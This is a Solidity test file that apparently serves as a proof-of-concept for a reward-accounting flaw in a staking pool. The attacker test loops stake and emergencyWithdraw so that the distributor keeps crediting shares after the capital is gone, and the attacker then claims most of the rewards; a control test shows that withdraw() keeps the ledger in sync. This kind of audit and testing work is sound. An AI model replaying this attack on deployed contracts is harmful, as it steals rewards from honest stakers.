// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "../../src/IERC20.sol";
import {StakingPool} from "../../src/StakingPool.sol";
import {RewardDistributor} from "../../src/RewardDistributor.sol";

contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Distinct msg.sender without cheatcodes.
contract Actor {
    MockToken immutable token;
    StakingPool immutable pool;
    RewardDistributor immutable dist;

    constructor(MockToken t, StakingPool p, RewardDistributor d) {
        token = t; pool = p; dist = d;
        t.approve(address(p), type(uint256).max);
    }

    function stake(uint256 a) external { pool.stake(a); }
    function withdraw(uint256 a) external { pool.withdraw(a); }
    function emergencyWithdraw() external { pool.emergencyWithdraw(); }
    function claim() external { dist.claim(); }
}

contract PhantomSharesTest {
    MockToken stakeTok;
    MockToken rewardTok;
    StakingPool pool;
    RewardDistributor dist;
    Actor honest;
    Actor attacker;

    uint256 constant C = 1000;
    uint256 constant CYCLES = 10;
    uint256 constant REWARD = 1100;

    function _setUp() internal {
        stakeTok = new MockToken();
        rewardTok = new MockToken();
        pool = new StakingPool(stakeTok);
        dist = new RewardDistributor(address(pool), rewardTok);
        pool.setDistributor(dist);
        honest = new Actor(stakeTok, pool, dist);
        attacker = new Actor(stakeTok, pool, dist);
        stakeTok.mint(address(honest), C);
        stakeTok.mint(address(attacker), C);
        rewardTok.mint(address(this), REWARD);
        rewardTok.approve(address(dist), type(uint256).max);
        honest.stake(C);
    }

    function _check(bool ok, string memory why) internal pure {
        require(ok, why);
    }

    /// Attack: stake/emergencyWithdraw loop leaves the attacker with 0 stake but 10*C shares.
    function test_phantomSharesCaptureRewards() public {
        _setUp();
        for (uint256 i; i < CYCLES; i++) {
            attacker.stake(C);
            attacker.emergencyWithdraw();
        }

        // Attacker holds all capital back and no pool balance...
        _check(stakeTok.balanceOf(address(attacker)) == C, "attacker capital not returned");
        _check(pool.balances(address(attacker)) == 0, "attacker still has pool balance");
        // ...but the distributor still credits phantom shares.
        _check(dist.shares(address(attacker)) == CYCLES * C, "no phantom shares");
        _check(pool.totalStaked() == C, "pool total should be honest stake only");
        _check(dist.totalShares() == (CYCLES + 1) * C, "totalShares not inflated");

        dist.notifyReward(REWARD);
        attacker.claim();
        honest.claim();

        uint256 a = rewardTok.balanceOf(address(attacker));
        uint256 h = rewardTok.balanceOf(address(honest));
        _check(a == 1000, "attacker reward != 1000 (10/11 of 1100)");
        _check(h == 100, "honest reward != 100 (1/11 of 1100)");
    }

    /// Control: same loop with withdraw() keeps the ledger in sync; the attacker earns nothing.
    function test_control_withdrawLoopEarnsNothing() public {
        _setUp();
        for (uint256 i; i < CYCLES; i++) {
            attacker.stake(C);
            attacker.withdraw(C);
        }
        _check(dist.shares(address(attacker)) == 0, "control: shares should be 0");
        _check(dist.totalShares() == pool.totalStaked(), "control: ledger out of sync");

        dist.notifyReward(REWARD);
        attacker.claim();
        honest.claim();

        _check(rewardTok.balanceOf(address(attacker)) == 0, "control: attacker got reward");
        _check(rewardTok.balanceOf(address(honest)) == REWARD, "control: honest should get all");
    }
}
